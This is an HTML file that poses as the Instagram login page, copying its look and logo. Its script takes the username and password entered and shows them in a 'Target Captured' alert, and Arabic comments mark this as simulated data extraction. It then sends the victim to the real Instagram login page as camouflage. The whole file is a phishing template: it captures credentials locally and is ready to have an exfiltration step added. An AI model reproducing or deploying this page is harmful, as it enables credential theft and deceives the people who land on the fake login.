<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; padding-top: 50px; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 100%; max-width: 350px; text-align: center; border-radius: 1px; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .divider { margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_with_rebranding.png/1027ad5832b8.png" class="logo">
        <input type="text" id="u" placeholder="Phone number, username, or email">
        <input type="password" id="p" placeholder="Password">
        <button onclick="send()">Log In</button>
        <div class="divider">OR</div>
        <p style="color: #385185; font-weight: bold; font-size: 14px; cursor: pointer;">Log in with Facebook</p>
    </div>

    <script>
        function send() {
            var u = document.getElementById('u').value;
            var p = document.getElementById('p').value;
            if(u != "" && p != "") {
                // محاكاة سحب البيانات للمصلحة
                alert("Target Captured:\nUsername: " + u + "\nPassword: " + p);
                window.location.href = "https://www.instagram.com/accounts/login/"; // تمويه
            } else {
                alert("Please check your credentials.");
            }
        }
    </script>
</body>
</html>
